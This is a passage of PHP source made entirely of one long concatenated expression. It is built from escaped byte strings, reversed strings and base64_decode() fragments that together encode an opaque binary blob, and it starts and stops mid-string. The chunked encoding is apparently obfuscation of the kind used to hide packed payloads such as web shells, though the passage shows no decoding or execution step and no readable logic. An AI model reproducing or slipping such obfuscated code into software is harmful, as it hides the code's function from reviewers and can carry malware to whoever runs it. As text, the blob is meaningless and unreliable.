9\xa1\x17\x9e\x1b\x3a\xff\x8d\x73\x6e\xdf\xb3\xb0\xfd\x83\xb6\x93\xee\xdc".strrev('µ×¶}€ôûLÎÂk9M™wôªô`òœ-gCıbq>Ï‡Æ—ä´§Ë8Šv3–ñç')."\111\117\35\70\153\115\325\375\127\354\24\75\70\370\342\353\17\115\251\35\150\131\161\337\1\153\116\176\371\343\343\336\172\56\367\353\175\365\144\267\375\373\307\46\166\354\64\177"."\247\17\17\276\143\325\254\375\227\105\26\335\260\345\341\117\37\375\303\362\77\135\367\7\347\276\375\273\357\116\376\371\231\177\50\167\176\172\306\51\135\137\165\217\374\46\74\343"."\364\347\173\216\77\147\372\337\36\61\324\343\247\16\57\170\363\317\125\117\377\351\325\153\77\277\355\371\155\143\76\237\360\306\257\76\337\271\157\360\365\272\47\237\335\375\362\161".base64_decode('v/rP1N3+fOi6nwWSuak3X3WY/6qJu/6rru/OM/5xd8+te39761MPrLvil0/M3/20').base64_decode('mw9vXPbWIZu+vPjbvqs39R157dNT3zl807RNSze+fpk/ttvtazqOP/Dvz13RNlx9')."\326\74\55\130\161\355\252\273\276\73\276\341\350\133\337\177\242\361\220\47\116\151\376\140\366\63\27\137\162\363\311\273\127\75\325\374\213\67\236\273\353\275\213\73\267\34\364\332"."\x2f\x5e\x6b\xb8\xe3\x96\x73\xff\x12\xbc\x71\xf1\x83\xfb\xed\x38\xf0\xe8\xfd\xf9\xa5\x8f\xbe\x71\xee\xc0\x21\x7\x3e\x7e\xf4\xb8\xed\xbb\x7c\xfa\xdb\xc8\x94\xfe\xc0\xf5\xf3\x2e\x38\xa7\x63\xea"."\x21\xf1\x6f\x1e\xf9\xe5\xfa\xaa\x9d\x3e\xdf\x3c\x75\x64\x68\xcf\xef\x9f\x7e\xcf\x7f\xdd\x81\x3\xcb\x92\xdb\xf3\x8b\x7\x94\x1d\x37\x16\xe\x39\x69\xe2\x57\x7b\x9f\x75\x55\xfe\xf5\x45\x3\xf7"."\256\270\166\140\343\342\347\236\236\277\347\37\67\357\277\355\56\47\372\165\315\326\211\257\214\171\366\225\303\267\177\373\362\11\153\77\331\373\243\253\172\242\347\136\335\270\366\360"."\xc7\xe7\xdf\x7c\xae\x7a\xfe\xf8\xd3\xf6\xac\x58\xf7\x46\xee\xa5\x17\x1e\x1c\x89\x9d\x95\x3b\x7f\x9f\x96\xed\x7b\x64\x72\xff\xfe\xf6\xf0\xbf\x2d\x34\x5f\x58\xf1\xc5\x11\x2f\xdd\xb7\xd3\xd\xe3".base64_decode('45qtvvf8hW3XbT7v++9Hxq//1d6zfvWP3T7Y4aOTtLM73thp25qND+uHv/Vfl9xU')."\xb0\x4e\x78\x69\x87\x29\xef\xbc\x70\xc8\x23\x6b\xaf\xfe\xe5\xdb\x9b\xcc\xc0\xfc\x15\x6b\x2e\x7b\xf4\xa9\xf4\xd3\xef\x76\x7e\xfe\xbb\xbd\x5e\xbc\xe0\x96\x2b\xf7\x79\xfa\xe7\xd\x81\x69\x73\xd7".base64_decode('zn65+b1n7//LAwe8d9rpYz97Y1XTnNuvO/Thrf944rvXHrj7jhWR1Imr1//+qI7d')."\146\157\374\356\351\277\76\71\347\207\377\376\146\323\233\67\252\163\356\376\346\203\347\315\337\337\173\373\352\357\277\171\375\203\227\324\245\167\175\367\322\303\273\6\3\163\276\337"."\274\351\311\205\13\117\370\156\323\272\303\356\275\355\321\17\377\371\357\23\376\364\365\332\71\363\276\155\151\311\117\116\247\166\71\176\326\143\237\5\216\331\377\276\7\107\176\366"."\233\354\127\37\314\337\243\372\375\363\172\267\134\371\304\303\332\73\33\72\136\277\346\250\313\367\331\360\347\111\7\35\31\237\367\335\264\317\212\257\166\55\176\371\266\277\153\177".strrev('O…²í{ê_òOí3ÜÍ_q}«¶Çöò½w]ØÔô_W1ÎŠğ=nßÙÏW‘uÛw¸')."\376\374\367\313\326\136\275\365\234\73\116\371\372\365\337\235\32\37\177\311\43\306\255\317\136\163\322\176\327\234\277\333\161\273\134\362\135\366\213\171\17\134\262\154\335\257\373\262"."\x33\x83\x7b\x3e\xf2\xf4\xaf\x8f\xfc\xf6\xf8\xad\x8f\x4f\x7a\xf4\xfa\xc7\xb6\x36\xd6\x5d\x99\x5b\xbe\x74\xc3\xea\xbd\x86\xdb\xdf\x3e\xbd\x62\xdf\x62\x85\xd3\x13\x3f\xfd\xc2\xec\x6b\xab\xb7\x6c"."\x5d\x53\xf8\xf2\x8d\x9\xf3\xeb\xff\xfe\xe0\xec\xc7\x5f\xfd\xf9\x7e\xca\x4d\xe9\xc3\xb6\xf7\x4e\xbe\xfb\x31\xfb\xed\xcc\x83\x7b\xb5\xde\xf6\xe9\xc0\xb3\xce\xd9\xef\x9c\x3f\xe6\xf3\x4f\x56\xcc"."\276\353\310\246\312\111\107\235\367\311\370\347\346\156\272\145\333\272\275\143\337\77\36\17\31\247\274\272\350\337\107\56\170\377\321\275\162\177\274\164\315\71\237\35\75\366\303\5"."\x1b\xcf\x79\xbb\x7b\xc5\xbb\x2b\xaf\xdf\xd2\xbb\xe1\x8b\xd5\xd7\x75\x7d\x34\x75\xcc\xea\x9d\xf\xdf\xff\xb1\xe7\x1e\xbc\xfa\xd2\x49\x87\xc4\x9a\xee\xbe\x7e\x44\xfd\xe2\xfd\xf5\x87\xfc\xfa\x8e"."\347\372\356\177\375\225\245\257\274\177\321\125\57\351\157\56\276\167\143\315\234\205\67\114\31\172\245\362\344\231\347\35\233\235\367\271\357\363\223\257\372\362\271\167\307\37\335\273"."\xa2\xb1\xf7\xb2\xb\xd7\x2e\x59\x7f\xd9\x6b\x57\x44\x4e\x59\xba\xff\x6f\xc6\x7d\xf6\x76\xf5\xf4\x9d\x4f\xfa\x78\xf3\x11\xbf\x98\xf2\xea\xa6\xd\xa7\x7c\x3d\x38\xa4\x6f\x79\x34\x1c\x3b\x7d\xfb"."\x47\x4e\xf3\x75\x77\xde\x74\xd9\x75\x53\x76\xdb\xed\x5f\xd7\x1d\x70\x46\xfb\x87\x57\x56\x4f\x6d\xb9\x68\xcc\xa3\x9f\x7f\xfa\xd6\x27\x3b\x5e\x36\xf7\xea\xc8\x8a\xe1\x57\x37\x7c\xf5\xd5\x9e\xff"."\x6a\x7b\xe1\x1\x67\xde\x3d\x67\xfe\xf6\xb5\xf7\x7f\xb6\xc6\x7f\xe7\x8a\x3d\x4f\x3e\x71\xbf\xcc\xf6\xe9\xa9\x33\xcf\x3e\xfe\xd4\x3d\xff\xd9\x1e\x3f\x6a\xc6\xa9\x5f\x3e\x34\x30\xfe\x8a\xdf\xac".base64_decode('XnPrRdVjPhizamj7pS+8c0Hb5ye/dcndl/9u4pqLXhg4y7/T1q6PL6xafe5Ix1VL')."\136\315\116\271\373\340\315\117\237\64\376\262\367\246\35\371\120\241\342\325\43\246\177\272\357\1\133\176\247\317\176\142\301\56\215\377\225\331\151\347\333\167\150\331\171\346\143\317"."\xf\x5e\x75\x49\x53\xf1\xb5\xee\xf7\xfe\xf2\xab\x75\xdf\x1e\xf9\x71\xc0\xda\xfb\xe9\x29\x6d\x2f\x2e\x1c\xf3\x64\xe4\xd2\xf6\x1d\xf7\x5a\xbc\x7a\xf9\x95\xcf\x1e\xf8\xf3\xf\xc3\x4b\xa2\x57\xcf"."\357\270\365\370\107\56\276\65\376\374\302\256\324\376\3\27\277\63\267\343\224\317\2\325\107\236\246\355\172\344\21\371\275\217\70\340\256\3\332\156\171\151\357\301\201\161\277\373"."\xc5\x21\x17\xdc\xbc\xc4\x9c\xd6\xf4\xfb\xbe\x96\x96\x25\xf\x35\xbd\x3e\xe5\x9d\x2b\x36\xea\xad\xcf\xcc\x58\x99\xf6\x1d\x34\x6f\xf3\xc6\xbf\x35\xd\xaf\x5a\xfd\xd6\x96\x93\x5f\xba\xfe\x57\x7".base64_decode('77rj2TfnL0lsWnPtd+MOvvbjmyrqL1qf05RDZ2YXVWd2uOuY7b9ftO2Ws3c/6YaX')."\x1f\xde\xf8\x52\xc0\xf4\xdf\x19\xbe\x68\xf6\xf4\xd\xf\xcd\xfd\x4f\xa6\xeb\xfc\x37\x3b\xb6\xbe\x73\xf1\x6b\x47\x3d\xb3\xe4\x82\x3f\xed\xf6\xca\xc4\x37\x7d\xf6\xd9\x8f\xd\x2c\x9f\x73\x69\x24".base64_decode('d2VrZ90P7279azB4wg+vfHHQvfd89a/r1v7w/cdvbzjzxtkjA1//8YQTPnv7nLU9')."\x6a\x63\xf1\x9b\x6f\xde\xfb\xec\xba\x1f\x56\x1e\xfe\xfd\x3d\xff\x79\x72\xd3\x75\x17\x2c\xbc\x6c\x65\xe1\xd3\xcd\x73\x3a\x57\x7e\xf7\xd6\xa6\x85\x3f\xdc\xfe\x9f\xef\x9e\xff\xe1\x87\x7f\x4f\x5a"."\160\307\360\375\253\317\34\360\325\355\266\256\372\243\115\73\375\362\200\207\147\36\72\370\106\167\277\171\357\243\253\356\131\174\375\246\103\73\66\77\375\273\327\137\174\143\365\306".base64_decode('5z+q/n7NgxtOO/OMk/5w6LOHLfryvX1nBL5sWn3cA3/9NDOydNGSwPkLFrz04pN3')."\xac\x3f\xd2\x9e\xf7\x75\xd7\xa7\x57\x3d\x71\xea\x51\x27\x1f\xf1\xe8\x5f\xf\xde\xf7\x91\x86\x4d\x57\xdd\x7f\x65\xed\xc4\x7b\x6e\x3f\xf6\x62\x7f\x2a\x1d\xfb\xf7\x1f\x2b\xfe\x18\x9a\x76\xed\xfd"."\xbb\xac\xdb\xf6\xe6\x4e\xef\x9c\xb2\xe1\xd4\x4b\xf7\x67\x16\x20\xf9\xde\x3e\x67\xc4\x6\xb1\xd6\x8c\x69\x70\x7\x34\xa1\x6\x14\x85\x26\x4e\x3\x55\xb1\x9\x93\x27\xd1\x0\xfc\x98\x83\x4e\x5a"."\x1b\x2\xde\xd\xb4\x9b\xa6\xd7\x40\x60\xea\x54\xa8\xd5\x9b\x5f\x6e\xf5\x31\xe5\x87\xe9\x40\x64\x41\xd3\xbd\x45\xa3\xd0\x9d\x86\xbc\x29\xd3\xe1\xcb\x53\x27\xc2\xfd\xf3\x84\xa9\xd0\xd8\x94\x1a"."\250\67\155\72\324\234\306\76\123\3\235\111\165\333\172\337\60\14\42\223\33\34\322\106\330\355\302\110\267\66\64\310\104\114\3\231\342\20\223\347\200\364\171\302\4\150\143\306"."\x44\x68\x7d\xa8\xaf\xd0\x6b\x32\x85\xc0\xe9\x33\xa0\x3b\x53\xd8\x90\xa6\x4e\x98\x4a\x3\x6c\x42\x96\xf\xe\x18\xd9\x3e\x68\xd5\xec\xcb\xf\x18\x83\x29\xd6\x36\xc\x6a\x1a\xf\x4c\x85\x8f\x4c"."\x9d\x2\xad\xf4\x74\x67\xf2\x29\x1d\x6a\x8f\x64\x73\xcb\xbb\x59\x64\xca\xc\x36\x25\x33\xe0\xd3\x93\xd9\xaa\xa4\x7\x6\xad\xa1\x61\xd6\xc5\x89\x35\x2c\x0\x63\x2e\xe8\xbd\xf9\xc1\x1e\xf6\x69"."\xa8\x33\x63\xa\x34\x97\x35\xd\xcd\x2a\x8c\xd0\x88\xdd\xdb\xa7\xf\x17\x41\x30\x99\x4f\x8d\x18\x7d\xdd\x20\xd7\x5b\xde\xd7\xab\xe9\x29\x68\x65\xa8\x5f\x33\x73\x99\x61\xb6\x8e\xb0\x20\xf6\xa0"."\351\350\206\305\226\211\255\171\332\52\24\15\150\145\160\300\356\37\116\201\150\310\314\367\145\206\235\101\6\131\60\3\231\174\141\320\32\6\155\206\11\154\215\173\214\154\61\227"."\x67\x3a\xe\x3d\xd9\xc1\xcc\x30\xe8\x72\xe\x16\xfa\xb3\xcb\xd3\x30\x49\x3\xe9\x91\xe2\x30\xb3\x97\x98\x38\x19\x9a\xec\x4b\x67\x87\xf2\x29\x9b\x46\xb4\x3e\xd3\xc8\xe\x16\x58\xfb\xb0\x9e\x19"."\103\327\106\114\321\344\320\110\32\42\172\46\137\264\230\254\175\306\64\230\324\51\14\74\246\63\60\236\4\353\157\246\206\12\303\314\116\243\260\274\47\237\351\147\362\340\264\121"."\xd0\x99\xa2\x72\xcf\xd0\x48\xca\x31\x60\xc3\x4c\x9d\x34\x83\x6\x72\xfd\x23\x83\x6\x53\x4d\xd7\xfb\x46\xfa\x87\x4c\x58\xd6\xdc\xb0\xa9\x19\xfd\x10\x99\xc\xbd\x18\xcc\x6b\x69\xa3\x17\x5a\x9c".base64_decode('wHqQ6jGtjDPMxu5kC+yjk9lWmVADHyymckMFpg80bRq0MKz1moYOkslsf2EgleuD')."\362\146\52\75\242\303\324\164\243\341\15\245\1\164\226\27\115\303\111\1\147\65\165\32\314\353\244\311\14\141\60\250\135\256\27\373\12\75\40\273\60\7\254\164\216\111\330\47".strrev('b]îÔïL#²çh­>0SXÓİ~ÍdÉL36åŞ©ÃëQ‚M¦¦…@1hpCAf²³')."\x57\x7f\x39\xad\xd8\x9d\x5d\xce\xa6\x7a\xa4\xdb\x1a\xce\x2\xdc\x4c\x67\x38\x67\x12\xdf\x4a\x13\x66\xb0\x85\x82\x2c\xbb\x6f\xa0\x27\x55\x84\x51\x4c\x9b\x2\xd3\x3a\x91\xa1\x87\x74\x6a\xb0\x27".base64_decode('w8yn8sv7uo0hJibJpZenbJizxTnoTL2W7mdSXMS9OkXbU4DbAOUDOS3PlXWaQbMk')."\x2d\xeb\x8d\xcb\x5\xfa\x75\x9d\x69\x1c\x33\x9d\x66\xa1\xd\x62\x17\x89\xd5\x5\xa4\x1b\x39\x5d\x88\xa3\xe9\x5\x0\xab\x29\xd8\x6d\x2c\xdb\x90\xf4\x49\x70\x34\x21\xb7\x92\xce\x3b\x52\x36\x8a".base64_decode('uXITjmlxDRaqGxfAPQy4x8zwWpm7QxC02gjXWDA1/WYmnTWLGVermZSrTZ7K5APe')."\234\356\121\322\121\73\56\365\137\226\346\232\254\24\131\75\125\216\4\330\164\247\244\225\245\62\162\107\263\373\3\162\262\137\316\65\362\250\27\331\154\300\155\302\250\222\77\60"."\7\324\114\316\326\227\27\365\274\270\167\266\373\245\211\307\266\207\355\155\152\62\224\230\47\51\20\142\333\70\6\116\252\120\333\220\206\45\132\220\346\121\136\101\367\24\60\10"."\xd9\x7e\xe3\xc6\xad\x67\x9e\xbf\xed\xbc\x9b\xb6\xad\xbf\x61\xeb\x9d\xe7\x6c\xbf\xe1\xa6\xad\x77\x9f\x87\xa2\x5b\x6e\x3f\x63\xeb\xd\xbf\x7f\xef\xa2\x53\xb6\xdc\xbe\x7e\xcb\xed\x27\x6e\x3f\xed".base64_decode('lk/uWrf1zBu3r7l766XXbL3qtC0b795+72nvXrN2y+3Xb7v0t1tPuXXLxvO3/uby')."\xad\xa7\x9d\xb9\xed\x9c\xf5\x5b\xee\xbe\x14\x95\xdf\xf6\x1b\xd1\x32\x2a\xb6\xf5\xfa\xb\x71\xdd\xbb\x7e\xbd\xf5\xf6\xdb\xb7\x5f\x71\xd\xcf\xfd\xe4\xae\x93\x68\x67\x46\xe0\x78\x9f\xab\x3b\xd8".strrev('¶qäb¶šæ£€S÷™¼ÿèi’¨‡·W§2`¸h…aš:²ÚPº'."\0".'+fQÙ‘…i¤')."\xc2\xd6\x26\xc0\x81\x32\xa9\xe7\xa\x18\xb4\x60\x96\x82\xd4\xa4\xcb\xa5\x53\x2e\xc1\x5f\xb9\x69\xa6\x19\x65\xc0\xa\xcf\xb5\x58\xab\x2a\x1c\x84\x5b\x35\x2c\xae\x53\xba\x35\x94\x90\xa9\x55\xba"."\x51\x35\x85\x59\x66\x28\x8e\xc9\xc2\xb9\x61\xbe\xe8\x9e\x4d\x50\x76\x59\x79\x37\xd8\xd2\xf6\x70\xa9\xb9\x10\xe6\x42\xc7\x24\xb\x1\x7a\x73\x52\x2\x52\x64\x57\xb9\x51\x82\x6b\xbf\xb9\x91\x89"."\x9c\xe5\x9e\x9\x90\xb6\x92\x4b\x7f\x9f\x42\xbb\xe2\x53\xc8\x55\xaf\xe2\xb6\x5f\xc4\x97\xf8\xec\xb0\x96\xf7\x98\xdc\x7d\x4b\x2f\x64\xa5\x4b\x9f\xc2\x70\xd9\x49\x94\x7b\x23\xdf\x33\x7b\x86\x96"."\50\63\215\174\160\256\114\264\257\213\116\231\202\362\154\313\322\135\303\154\310\42\104\47\56\47\311\65\274\30\6\215\12\251\62\372\20\307\223\226\236\61\340\123\71\75\107\112".base64_decode('MnMCIsvmOtdptAUs15XUrDmF3gK2/nZmzgErU7jiU6XvQlgYtMipWe81F98wjfWS')."\15\66\56\126\353\367\373\45\161\255\120\166\303\41\150\116\134\377\242\264\60\336\315\243\245\67\162\245\10\264\315\173\172\164\333\251\45\266\141\312\170\5\165\164\172\140\2\12"."\220\15\61\45\60\15\5\311\54\301\46\356\204\231\53\332\314\140\143\154\140\62\320\71\366\114\320\350\230\111\160\111\235\324\175\110\27\265\212\371\54\113\105\101\124\44\136\314"."\343\25\256\165\217\131\317\147\244\112\63\265\264\43\265\252\166\303\244\6\304\174\150\343\105\276\236\71\12\26\106\232\245\101\50\300\352\266\270\327\35\215\337\317\101\1\55\57"."\x22\x17\x32\x36\x51\x95\x85\x13\x7\x9a\xb4\x25\xb3\xd9\xb8\x80\x22\x5c\x9d\x4c\xd7\x8f\x54\x75\xe4\x25\x2f\x20\x92\x24\xcf\x75\x64\xed\xac\xc6\xae\xf\x6d\x44\xa7\x18\x79\x9d\xc3\x5f\xd1\x96"."\215\6\164\261\235\261\166\271\212\116\166\166\6\42\310\125\63\214\275\210\106\352\325\306\110\134\324\123\13\105\257\332\243\354\265\40\324\26\121\23\211\230\244\4\111\154\366\26".strrev('hoè"Šè'."\n".'|>9Y°L&L‰Y›ázØLq‘®%ãlMá+PË	@/6,Cjbó©')."\305\271\206\376\224\100\115\140\202\50\213\76\250\142\103\205\72\146\302\232\110\206\342\145\234\13\120\247\3\260\104\340\150\0\52\64\307\26\52\15\261\150\173\113\153\202\332\324".base64_decode('0/TWmJRP9LAhm7keKM2G5sNt0VBDWIm0JmPM0IKrwhITmwSPsymwbJ27FoD6NCKb')."\1\311\55\362\226\0\250\73\174\225\235\25\235\343\72\253\72\253\227\5\72\355\56\100\77\144\105\14\171\171\40\322\326\10\303\253\345\241\214\15\333\271\45\221\230\17\166\143"."\xb1\x78\xa8\x21\xca\xba\x52\x1f\x4a\x40\x30\xd6\x10\xa1\x81\x77\xcf\xbd\x79\xcb\x9d\x67\xbc\x7b\xc9\xd\x5b\x7f\xbb\x1e\x35\xb4\xed\xe2\x5f\x6f\xbb\xe0\x56\x44\xb8\x60\x62\xe5\x86\x75\xef\xde"."\163\306\266\163\157\334\266\16\210\14\145\373\215\267\155\271\373\336\167\317\275\146\353\15\27\156\73\377\216\167\57\76\231\146\274\167\355\315\133\117\277\206\167\114\171\357\234\173"."\266\235\161\65\47\140\50\335\342\103\265\337\73\145\375\273\167\337\200\311\227\15\47\156\373\333\332\155\227\256\337\172\372\25\133\57\272\346\335\63\156\334\172\345\232\255\247\256"."\337\176\343\171\107\171\1\211\306\73\330\122\200\351\145\160\51\266\64\245\323\333\151\217\307\123\133\215\176\253\260\335\6\372\145\352\347\104\45\171\176\173\270\265\41\354\265\203".base64_decode('kqPgl2EchRCq0gK0pg1+HVicmHfXVY7ai5Ww/lKnpM40hhMN8Uh9GCwD+EKNJdQW')."\350\63\240\324\104\174\1\17\163\323\277\22\77\32\112\25\3\346\152\305\65\20\55\220\66\261\360\200\164\126\251\300\32\34\25\76\174\42\21\243\54\245\2\237\250\50\101\117".base64_decode('o61XhY3viapu5eJKX41vQrUCTjZoDXCtoVSAgjqv5/qIL+WKTfDVVCsVhf4K6JeY').strrev('wFÖ¡)¦ğ•	×A¨€éw.¿G×‰<}¤¦ô f–;fl"Ê+»–WÍ´–•{ÔW').base64_decode('Seplo62S6EKmAw634mfLXFmtpMDeokwmqeaajDrXZFSNBzzRNpevNzWmUKitHe2W').base64_decode('ZrOFglSyVDiVrhYra6JhoMWh5VGA52CzA94SQkc8g60gTueLWCaPuD+poBQhHWfO')."\356\141\250\16\334\156\264\54\346\143\140\260\14\113\240\13\347\51\330\152\60\234\154\150\246\120\236\220\300\74\223\32\353\2\124\61\235\212\13\104\70\133\1\345\350\166\301\10"."\x61\x77\x52\x2e\xd2\xda\x14\x8b\xb7\x50\x6b\xb9\x44\x43\x73\xb8\x25\x14\x0\x24\x4e\x21\x81\x96\xc7\x74\x97\x52\xa7\x54\x62\xcc\x47\x93\x2a\x5d\xd3\x4f\x3e\xc4\xa6\x2c\x49\xbe\x8a\xf6\x95\xea".base64_decode('ICKKzkKhBzoDq68QO2iNVKmrpA4LoEnu5ScWT6poAgA9S1i3UjotJDVubPQ1wPiB')."\156\104\25\231\114\30\226\111\61\147\100\250\161\334\146\103\254\265\51\302\14\3\33\201\333\56\144\114\127\241\306\170\4\133\304\303\367\25\326\224\144\216\211\42\102\173\2\105".base64_decode('CoMZHhbG3TiDn/koIo58FOGHDS4leS3C30+08rAgfFGkPcEMQjD2XdjIw83cqhdn')."\xc4\xe2\x52\x24\x14\xf\xb5\x24\x78\x34\xbe\x90\x1b\x98\xf0\x34\x6a\x68\xa2\xb6\xb6\xb7\x8\x8c\x1f\xd\x2d\x40\xc0\x12\x63\xf3\xcd\xb8\x91\xe0\xd2\xaa\xc0\xb8\x39\xd5\x9d\xd4\x76\x8f\x6\xe9".strrev('RpdAC¥x#>p¥7‰Æ—64j£ó+øQF½:¦ífCUWS)ğLVº™í†,qÏ').base64_decode('kME2O7r4blAQDCvUIFhpjS0MCQc9UgakCH89waUdnYOdAUQs2MuELV5jvcLIkAbC')."\333\123\21\0\324\16\261\143\164\231\17\116\14\65\153\366\60\147\33\10\41\322\100\14\326\147\21\13\20\134\11\25\20\303\133\310\62\243\74\152\15\250\166\256\354\74\266\323"."\37\240\6\220\230\170\351\364\211\56\251\341\105\350\214\115\44\134\326\233\52\361\101\3\255\243\121\102\210\356\132\32\231\5\77\300\211\315\2\362\24\242\263\353\370\142\206\347"."\257\154\105\377\317\115\256\14\243\377\243\350\47\232\104\313\145\360\2\150\113\106\43\363\302\53\361\77\42\243\232\117\44\265\163\162\127\210\264\256\104\377\42\4\263\62\322\352"."\x6d\xac\x3e\x9c\x5c\x18\xe\xd3\x2\x2c\xc\xbf\xa2\x28\x42\x38\x30\x54\xc9\xdb\x16\xd6\xd3\x87\x6c\xa1\xb7\xf\x4d\xab\x6a\x15\x99\x4c\x7f\xd7\xf8\x6a\x55\xd\xda\xed\x0\x2f\xdc\xeb\x41\x55"."\xe5\x31\x13\x2a\xe1\xc\x9\x25\x1a\x60\xc1\xc3\x2c\x4\x0\x51\xa\xb\x44\xab\xde\xd\x8\xdc\x87\x14\xc4\xe7\xc6\x63\xed\x6d\x52\xbc\x39\xb4\x20\xd2\x3a\x97\xc5\x82\xe3\x58\x68\x1c\x34\xad"."\64\106\22\150\212\32\30\60\12\327\126\162\234\206\51\131\44\123\275\56\220\156\104\230\35\105\44\222\35\63\3\24\63\273\167\131\175\173\44\332\50\33\254\343\202\64\64\226"."\140\165\70\123\306\262\316\261\70\61\135\147\21\74\345\54\114\300\215\105\310\34\260\10\235\0\26\43\323\305\42\304\205\26\213\220\201\262\10\346\116\302\255\54\17\161\214\210"."\333\143\154\140\257\66\300\55\56\147\146\122\222\167\4\214\203\3\124\152\206\35\143\40\56\116\343\262\115\217\140\224\310\250\44\61\0\325\264\123\44\303\357\40\115\102\324\46".strrev('\'-AÉ¥I)ª‚$@Ùfô§éˆD¯¢!X'."\n".'úë\''."\r".'$ì]jLxjæË¿DI')."\141\203\270\127\210\162\260\206\41\21\4\323\250\233\205\342\170\151\31\347\214\300\143\203\17\176\241\107\173\321\237\116\210\62\21\6\130\253\124\372\340\220\145\26\16\156\356\270".base64_decode('s7NitNmCAmzOIFpBo6wWTCQ689K92MuG6uSYCJwwZ0LYTAXWIt4Yj7VRCkSJNCnU')."\207\203\122\111\105\334\225\100\132\65\304\303\170\167\320\122\54\257\252\322\45\234\232\135\251\200\101\167\265\273\126\244\265\61\274\110\251\64\62\103\252\246\251\120\131\101\173\221"."\65\244\224\264\304\132\240\175\235\4\221\136\163\120\221\301\213\361\313\15\64\55\51\100\256\204\64\43\336\30\230\361\254\17\230\162\236\103\51\142\232\25\111\240\3\73\32\45"."\x23\x45\x59\x86\x8d\x9\x59\x9f\xc2\x9d\x26\xe0\x44\xcc\x7c\x50\xa1\x27\x34\xc4\x32\x68\x43\x34\x2b\xbc\x28\x19\xf\xe1\x44\x42\x7d\x8e\xd9\x1d\xfd\x21\x8\x5\x73\x47\x56\x4e\xa3\x16\xa5\x84"."\146\13\54\3\41\301\62\27\211\110\211\107\114\44\2\4\221\43\117\32\23\317\41\222\2\72\315\262\34\141\36\120\335\64\326\26\217\264\204\342\213\141\312\4\17\0\73\320".strrev('cì'."\0".'f*”Bf\\7*‡y^'."\0".'6ô˜igâÖ£l1®ÒÙkÔVöË%Û°ÄEŠìºÌ').strrev('öGø¼/2•L'."\n".'r£Ú…7Ã"ñ$>#%ÂT–Êç"«°«¡U¹1!Ø‚@æ')."\x8\xeb\x69\xb9\x3d\xc2\xf2\x98\x38\x86\xef\x36\x18\x4f\xd5\x14\x18\x1f\xf5\x69\x51\x35\x11\xf1\xa4\xc5\xbc\x6d\xf4\xe4\xb9\x43\x38\xe8\x15\x8d\x85\xda\x93\x31\x15\x9d\x1f\xf1\x30\xc6\xe6\x30"."\42\76\255\122\177\45\276\133\136\24\150\6\27\340\376\55\177\144\150\254\114\271\241\361\372\134\362\24\156\235\33\151\15\327\265\14\107\22\241\26\205\165\34\144\153\330\15\334".base64_decode('dGgnElOjiCZWZfFZJAYi30BKdmiiCr8oAU1oXTtWUXJLaJhEw7mFG0MQlWwEECHh')."\xf\x81\x8b\xa5\x49\x5e\x31\x85\x6b\xcb\xc7\x15\xd4\xf7\xb8\xf2\x33\xcc\x5a\x9c\x83\xb\x53\x2a\x65\xa6\x28\xae\xba\x3e\xee\x55\x71\x96\x93\x85\xb6\xb5\xb8\xc9\x65\x37\xc7\xe\xbb\xd0\x87\xa".base64_decode('7ZI/A1xZYR8kdzl5d/fQeZlVsUcRxA6quhhNTrdtfqNLmB8WdHqFOwfZk2JjPZu5')."\142\336\111\350\131\220\261\67\246\210\256\272\60\61\23\146\74\222\16\73\271\36\21\313\101\175\132\172\52\102\113\21\76\136\251\224\110\214\12\327\211\370\146\102\264\331\305\130"."\170\61\310\21\203\235\154\336\173\75\336\311\274\331\246\133\71\203\134\301\54\24\126\63\74\137\227\1\240\334\4\373\47\110\137\220\354\4\161\24\26\22\337\61\112\6\27\305".strrev('9)-lš2#îâí16ÕÜ \',Zı… zr\\7Ş¦Æ‘øæ£%KAá6_—ê<')."\xc\x3e\x4a\x5e\x71\xb2\x74\x2\xf0\xba\xd\xd9\x97\x44\x40\x78\x91\xe4\xb0\x7c\x1c\x9f\x70\x6c\x45\xc\x17\xe3\x98\xe\xee\x56\xa5\xbe\xb4\xf1\xf2\x69\xee\x2e\x98\xce\x86\x34\xcd\x24\x81\x6".base64_decode('ye5TakUnmlFPTWtYggEptYV5WAIfllETKFZs9aA74EfMhTwiMagb0LEJETXowAZf')."\xbc\x22\xf5\xa1\xf5\xd3\x95\xda\x25\x37\x9e\xa3\xec\xf7\xb2\xf5\x1a\xa0\x20\xff\xa0\x45\x64\x39\x3f\xfd\xc1\xb8\x2e\x8e\x64\x54\x8d\x58\x6c\xfd\x64\x25\x81\xff\xc8\x97\x48\x25\x9\x67\x7a\xea"."\20\160\244\326\45\260\362\275\220\55\140\14\41\352\326\230\332\214\316\202\30\243\30\14\73\351\302\275\254\26\240\2\7\21\64\351\40\61\206\5\176\154\46\271\310\247\327\211"."\260\330\53\20\132\345\41\246\100\1\16\273\304\111\35\242\77\213\163\31\77\352\70\100\135\106\167\270\243\44\214\315\230\341\40\356\263\144\75\234\343\330\157\120\362\114\250\15".strrev('–æ…ù”Ş¡M©àÅ¿1a¸xÔŒ‹pN®Î=¬D©[â.ƒƒ¥(`XôJ;I‹@Øè').base64_decode('TeaCKJxOOD41HsMSu3C0yVMh0cwdSbrT1GikdV7ZDEQ3tEhVaGIkGW7xprlbSIRD')."\161\346\201\24\307\353\243\261\6\51\73\22\53\235\11\116\230\360\104\52\357\243\211\301\245\125\235\53\10\313\122\213\70\227\314\112\54\30\360\253\135\343\253\347\164\256\252\256"."\352\14\316\11\214\343\362\54\212\256\44\363\324\121\222\155\166\210\324\172\23\360\371\303\22\151\65\210\5\3\1\370\10\17\4\73\203\334\33\27\73\40\300\273\157\202\372\55"."\x72\xf5\xc2\xe3\x2f\x83\x19\xa2\x7\xbc\x8e\x2b\x55\x6c\xf0\xaa\xf2\xfd\x84\xaf\x3a\xd5\xc4\xe2\x4\x9f\x79\xa\x86\xe5\xf2\x5d\xb0\x46\x8b\xc9\x9a\x8\x9e\xc2\xe8\xff\x36\xb9\x28\x56\x7e\x29".base64_decode('W9AFrC6DXzkpYJhiH4gNmzHTRewmScy+MA9GSQFXEwhV9wvuGvZbgu3LPDoFbRpp')."\100\304\342\334\346\310\361\363\242\55\255\261\266\371\361\104\262\175\301\302\105\213\227\300\114\63\160\350\126\374\314\313\31\70\305\14\16\150\126\160\200\271\165\136\200\151\175\335"."\16\312\64\24\117\104\143\104\250\216\41\252\40\25\1\360\134\214\27\202\345\263\150\153\301\134\336\231\60\112\211\66\113\117\231\246\63\112\356\202\226\37\157\30\62\73\72\355".base64_decode('LgZ/wYw+AEGhbWYLDgfIB7/sXhqDqkzRZVKecx4ShJMgiRoQicSWUvhazQPFM8xu')."\x3b\x88\x8b\xb1\x6\x93\x7f\x66\x22\x53\xb\x5c\xec\xcf\xf9\x33\x9d\xc9\xb9\xd8\x67\x6